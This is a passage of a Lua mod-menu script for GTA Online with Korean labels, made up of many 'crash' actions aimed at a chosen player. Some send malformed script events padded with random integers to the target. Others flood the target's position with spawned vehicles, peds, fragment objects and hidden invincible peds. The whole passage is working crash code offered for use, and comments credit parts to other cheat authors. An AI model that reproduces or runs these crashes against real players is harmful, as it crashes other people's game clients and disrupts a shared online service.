        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            for i = 0, 100 do 
                local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            util.yield(10)
            entities.delete_by_handle(Object_pizza2)
            entities.delete_by_handle(Object_pizza2)
            entities.delete_by_handle(Object_pizza2)
            entities.delete_by_handle(Object_pizza2)
            return
        end
    end)

    menu.action(modelc, "모델 크래쉬 V5", {"crashv18"}, "X-force 방식을 가져오다", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
		local pos = players.get_position(player_id)
		local mdl = util.joaat("u_m_m_jesus_01")
		local veh_mdl = util.joaat("oppressor")
		util.request_model(veh_mdl)
        util.request_model(mdl)
			for i = 1, 10 do
				if not players.exists(player_id) then
					return
				end
				local veh = entities.create_vehicle(veh_mdl, pos, 0)
				local jesus = entities.create_ped(2, mdl, pos, 0)
				PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
				util.yield(100)
				TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
				util.yield(1000)
				entities.delete_by_handle(jesus)
				entities.delete_by_handle(veh)
			end
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    end)


    menu.action(modelc, "모델 크래쉬 V6", {"crashv19"}, "X-force 방식을 가져오다", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(modelc, "모델 크래쉬 V7", {"crashv26"}, "X-force는 미끄러 질것 입니다.", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
            end
            util.trigger_script_event(1 << player_id, {-555356783, 3, 420, 69, 1337, 88, 360, 666, 6969, 696969})
    end)

    local pclpid = {}

    menu.action(modelc, "모델 크래쉬 V8", {"crashv28"}, "플레이어는 플레이어를 복제하여 (XC)", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        for i = 1, 23 do
            local pclone = entities.create_ped(26, ENTITY.GET_ENTITY_MODEL(p), c, 0)
            pclpid [#pclpid + 1] = pclone 
            PED.CLONE_PED_TO_TARGET(p, pclone)
        end
        local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id), true)
        all_peds = entities.get_all_peds_as_handles()
        local last_ped = 0
        local last_ped_ht = 0
        for k,ped in pairs(all_peds) do
            if not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) then
                get_control_request(ped)
                if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
                end
    
                ENTITY.DETACH_ENTITY(ped, false, false)
                if last_ped ~= 0 then
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, last_ped, 0, 0.0, 0.0, last_ped_ht-0.5, 0.0, 0.0, 0.0, false, false, false, false, 0, false)
                else
                    ENTITY.SET_ENTITY_COORDS(ped, c.x, c.y, c.z)
                end
                last_ped = ped
            end
        end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    local netc = menu.list(twotake, "크래쉬 더 레드", {}, "")

    local scrcrash = menu.list(twotake, "스크립트 크래쉬", {}, "")

    local secrcrash = menu.list(twotake, "SE 크래쉬", {}, "")

    menu.action(secrcrash, "SE 크래쉬 (S0)", {"crashv54"}, "Crash SE.", function(on_toggle)
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        end
        menu.trigger_commands("givesh" .. players.get_name(player_id))
        util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
            util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
        end
    end)

    menu.action(secrcrash, "SE 크래쉬 (S1)", {"crashv97"}, "Crash SE.", function(on_toggle)
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
            end
            menu.trigger_commands("givesh" .. players.get_name(player_id))
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
                util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
            end
    end)

    menu.action(secrcrash, "SE 크래쉬 (S3)", {"crashv84"}, "Crash SE.", function(on_toggle)
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-1990614866, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-1990614866, 0, 0})
            end
            menu.trigger_commands("givesh" .. players.get_name(player_id))
            util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-1990614866, 0, 0, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-1990614866, 0, 0})
            util.trigger_script_event(1 << player_id, {-1990614866, 0, 0})
            end
    end)

    menu.action(secrcrash, "SE 크래쉬 (S4)", {"crashv51"}, "Crash SE.", function(on_toggle)
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {697566862, 3, 10, 9, 1, 1, 1, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {697566862, 3, 10, 9, 1, 1, 1})
            end
            menu.trigger_commands("givesh" .. players.get_name(player_id))
            util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {697566862, 3, 10, 9, 1, 1, 1, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {697566862, 3, 10, 9, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, 3, 10, 9, 1, 1, 1})
            end
        end)

    menu.action(secrcrash, "SE 크래쉬 (S7)", {"crashv91"}, "Crash SE.", function(on_toggle)
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
            end
            menu.trigger_commands("givesh" .. players.get_name(player_id))
            util.yield()
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
            util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
            end
    end)

    menu.action(scrcrash, "스크립트 크래쉬 V1", {"crashv61"}, "", function()
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {697566862, player_id, 0, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, player_id, 1, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, player_id, 2, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, player_id, 10, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, player_id, 2, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, player_id, 6, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, player_id, 4, i, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {697566862, player_id, 9, i, 1, 1, 1})
        end
    
    end)

    menu.action(scrcrash, "스크립트 크래쉬 V2", {"crashv7"}, "", function()
        for i = 1, 200 do
            util.trigger_script_event(1 << player_id, {548471420, 16, 804923209, -303901118, 577104152, 653299499, -1218005427, -1010050857, 1831797592, 1508078618, 9, -700037855, -1565442250, 932677838})
        end
    end)

    menu.action(scrcrash, "스크립트 크래쉬 V3", {"crashv8"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
            end
            menu.trigger_commands("givesh" .. players.get_name(player_id))
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
            end
            util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
    end)

    menu.action(scrcrash, "스크립트 크래쉬 V4", {"crashv9"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 20 do
            util.trigger_script_event(1 << player_id, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
        end
        for i = 1, 20 do
            util.trigger_script_event(1 << player_id, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
            util.trigger_script_event(1 << player_id, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
        end
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
        end
        util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
        end
        menu.trigger_commands("givesh" .. players.get_name(player_id))
        util.yield(200)
        for i = 1, 200 do
            util.trigger_script_event(1 << player_id, {548471420, 16, 804923209, -303901118, 577104152, 653299499, -1218005427, -1010050857, 1831797592, 1508078618, 9, -700037855, -1565442250, 932677838})
        end
    end)

    menu.action(scrcrash, "스크립트 크래쉬 V5", {"crashv29"}, "Duele.", function(on_toggle)
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, player_id, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
                end
                util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, player_id, math.random(int_min, int_max)})
                util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                end
                menu.trigger_commands("givesh" .. players.get_name(player_id))
                util.yield(100)
                util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                util.trigger_script_event(1 << player_id, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                util.trigger_script_event(1 << player_id, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
    end)

    -- Skidded from keramist.

    menu.action(netc, "크래쉬 더 레드 V1", {"crashv13"}, "", function(on_toggle)
        local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
        local vehicles = {}
        for i = 1, 4 do
            util.create_thread(function()
                request_model(hashes[i])
                local pcoords = players.get_position(player_id)
                local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
                for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
                VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
                for j = 0, 49 do
                    local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1 
                    VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                    VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
                end
                for j = 0, 20 do
                    if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
                end
                VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
                VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
                for ai = 1, 50 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    pcoords = players.get_position(player_id)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                    util.yield()
                end
                vehicles[#vehicles+1] = veh
            end)
        end
        util.yield(2000)
        for _, v in pairs(vehicles) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
            entities.delete_by_handle(v)
        end
    end)

    menu.action(netc, "크래쉬 더 레드 V2", {"crashv14"}, "", function(on_loop)
        local cord = players.get_position(player_id)
        local a1 = entities.create_object(-930879665, cord)
        local a2 = entities.create_object(3613262246, cord)
        local b1 = entities.create_object(452618762, cord)
        local b2 = entities.create_object(3613262246, cord)
        for i = 1, 10 do
            util.request_model(-930879665)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(452618762)
            util.yield(300)
            entities.delete_by_handle(a1)
            entities.delete_by_handle(a2)
            entities.delete_by_handle(b1)
            entities.delete_by_handle(b2)
            util.request_model(452618762)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(-930879665)
            util.yield(10)
        end
        util.toast("다 됐습니다..")
    end)

    -- This is a Prisuhm crash fixed by me <3

    local krustykrab = menu.list(twotake, "돈 캉그레호", {}, "관전은 위험합니다. 2T1 사용자에게 적용됩니다.")

    local peds = 5
    menu.slider(krustykrab, "주걱의 수", {}, "얼마나 보낼지 선택 합니다.", 1, 45, 1, 1, function(amount)
        util.toast(players.get_name(player_id).. " 플레이어에게 스탬프가 보내졌다")
        peds = amount
    end)

    local crash_ents = {}
    local crash_toggle = false
    menu.toggle(krustykrab, "주걱의 수", {}, "관전은 위험하니 조심하세요.", function(val)
        util.toast(players.get_name(player_id).. " 주걱을 보냈습니다")
        local crash_toggle = val
        BlockSyncs(player_id, function()
            if val then
                local number_of_peds = peds
                local ped_mdl = util.joaat("ig_siemonyetarian")
                local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                local ped_pos = players.get_position(player_id)
                ped_pos.z += 3
                request_model(ped_mdl)
                for i = 1, number_of_peds do
                    local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                    crash_ents[i] = ped
                    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                    ENTITY.SET_ENTITY_VISIBLE(ped, false)
                end
                repeat
                    for k, ped in crash_ents do
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(ped, "PROP_HUMAN_BBQ", 0, false)
                    end
                    for k, v in entities.get_all_objects_as_pointers() do
                        if entities.get_model_hash(v) == util.joaat("prop_fish_slice_01") then
                            entities.delete_by_pointer(v)
                        end
                    end
                    util.yield_once()
                    util.yield_once()
